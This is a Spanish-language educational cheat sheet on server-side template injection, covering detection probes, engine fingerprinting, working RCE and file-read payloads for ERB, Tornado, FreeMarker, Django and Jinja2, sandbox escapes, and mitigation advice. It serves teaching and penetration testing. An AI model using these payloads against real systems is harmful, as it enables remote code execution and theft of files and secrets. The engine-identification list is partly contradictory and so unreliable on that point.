# 💉 SSTI

**Server-Side Template Injection (SSTI)** ocurre cuando la entrada del usuario se inserta directamente en una plantilla antes de que sea procesada por el motor de templates.

En lugar de tratar la entrada como texto, el motor la interpreta como código y la ejecuta.

### ✅ Uso normal (seguro)

```python
# El input del usuario se pasa como dato
render("Hello {{name}}", name=user_input)

# user_input = "{{7*7}}" → resultado: "Hello {{7*7}}"
```

### ❌ Uso vulnerable

```python
# El input del usuario se inserta dentro del template
render("Hello " + user_input)

# user_input = "{{7*7}}" → resultado: "Hello 49"
```

La diferencia clave es si el input se trata como **dato** o como **código**.

***

## 🧩 Motores de templates y su sintaxis

Cada motor usa una sintaxis distinta:

<table><thead><tr><th width="143.3636474609375">Motor</th><th width="132.90911865234375">Lenguaje</th><th width="103.0909423828125">Sintaxis</th><th>Payload RCE</th></tr></thead><tbody><tr><td>ERB</td><td>Ruby</td><td><code>&#x3C;%= %></code></td><td><code>&#x3C;%= system("id") %></code></td></tr><tr><td>Tornado</td><td>Python</td><td><code>{{ }}</code></td><td><code>{% import os %}{{os.popen('id').read()}}</code></td></tr><tr><td>FreeMarker</td><td>Java</td><td><code>${ }</code></td><td><code>${"freemarker.template.utility.Execute"?new()("id")}</code></td></tr><tr><td>Handlebars</td><td>JavaScript</td><td><code>{{ }}</code></td><td>Gadgets con <code>child_process</code></td></tr><tr><td>Django</td><td>Python</td><td><code>{{ }}</code></td><td><code>{% debug %}</code>, <code>{{settings.SECRET_KEY}}</code></td></tr><tr><td>Jinja2</td><td>Python</td><td><code>{{ }}</code></td><td>Acceso a <code>os.popen()</code> vía objetos internos</td></tr><tr><td>Twig</td><td>PHP</td><td><code>{{ }}</code></td><td>Callback con <code>exec</code></td></tr><tr><td>Pebble</td><td>Java</td><td><code>{{ }}</code></td><td>Manipulación de variables</td></tr></tbody></table>

***

## 🔍 Detección e identificación

### 1️⃣ Detectar SSTI

Pruebas básicas:

```
{{7*7}}    → 49
${7*7}     → 49
<%= 7*7 %> → 49
#{7*7}     → 49
```

### 2️⃣ Identificar el motor

Ejemplo:

```
{{7*'7'}}
```

Resultados:

* 49 → Twig o Jinja2
  * "7777777" → Jinja2
  * 49 → Twig
* "7777777" → Jinja2
* Error → revisar mensaje
* Nada → probar otra sintaxis

### 3️⃣ Revisar errores

Los errores suelen revelar el motor:

* UndefinedError → Jinja2
* TemplateSyntaxError → Django
* FreeMarkerException → FreeMarker
* Error en "handlebars" → Handlebars
* Stack trace de Tornado → Tornado

***

## 🎯 Puntos comunes de inyección

* Parámetros en URL (especialmente `message=` o errores)
* Editores de templates (CMS, blogs)
* Templates de email
* Comentarios o reviews procesados por templates
* Nombre visible del usuario
* Constructores de páginas personalizados

***

## 💣 Explotación por motor

### 💎 ERB (Ruby)

```ruby
<%= `whoami` %>
<%= system("cat /etc/passwd") %>
<%= File.read("/etc/passwd") %>
```

### 🌪️ Tornado (Python)

```python
{% import os %}{{os.popen('id').read()}}
```

Inyección en contexto existente:

```python
user.name}}{% import os %}{{os.popen('id').read()}
```

### ☕ FreeMarker (Java)

```java
${"freemarker.template.utility.Execute"?new()("id")}
```

Bypass de sandbox:

```java
<#assign classloader=product.class.protectionDomain.classLoader>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${ec.newInstance()("id")}
```

### 🤝 Handlebars (JavaScript)

Ejemplo de cadena compleja para RCE usando prototipos:

```javascript
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      ...
    {{/with}}
  {{/with}}
{{/with}}
```

### 🐍 Django (Python)

Django suele estar en sandbox:

```python
{% debug %}
{{settings.SECRET_KEY}}
{{settings.DATABASES}}
```

No suele permitir RCE directo, pero sí fuga de información.

***

## 🔓 Escape de sandbox

Algunos motores limitan funciones peligrosas, pero se pueden evadir:

### 🔗 Traversal de clases (Java/Python)

* Acceder a jerarquías de clases
* Llegar a funciones peligrosas (`Runtime.exec`, `ProcessBuilder`)
* Usar reflexión

### 🐍 Bypass en Jinja2

```python
{{''.__class__.__mro__[2].__subclasses__()}}
```

Buscar `subprocess.Popen` y ejecutar:

```python
{{''.__class__.__mro__[2].__subclasses__()[X]('id',shell=True,stdout=-1).communicate()}}
```

***

## 🧪 Exploits personalizados con código fuente

Si puedes leer código fuente:

* Buscar métodos peligrosos
* Rastrear datos controlados por el usuario
* Encadenar funciones

Ejemplo:

```php
user.setAvatar('/home/carlos/.ssh/id_rsa','image/png')
user.gdprDelete()
```

Resultado: se elimina el archivo sensible.

***

## 🛡️ Prevención y mitigación

### 🏗️ Usar templates sin lógica

* Motores como Mustache limitan ejecución
* Separar lógica y presentación

### 📥 Tratar input como datos

```javascript
# Seguro
render_template("page.html", name=user_input)

# Inseguro
render_template_string("Hello " + user_input)
```

### 📦 Usar sandbox

* Activar restricciones del motor
* Limitar clases y funciones accesibles
* Deshabilitar funciones peligrosas

### ✅ Validación de entrada

* Bloquear caracteres de templates (`{{`, `${`, `<%`)
* Usar listas blancas
* Sanitizar antes de procesar

### 🔑 Principio de mínimo privilegio

* Ejecutar con permisos mínimos
* No exponer objetos internos (`settings`, `config`)
* Limitar acceso a sistema y red

***

## 📚 Recursos útiles

* [PayloadAllTheThings (SSTI)](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) — colección de payloads
* [HackTricks (SSTI)](https://hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html) — metodología y explotación
* Documentación del motor — revisar funciones peligrosas
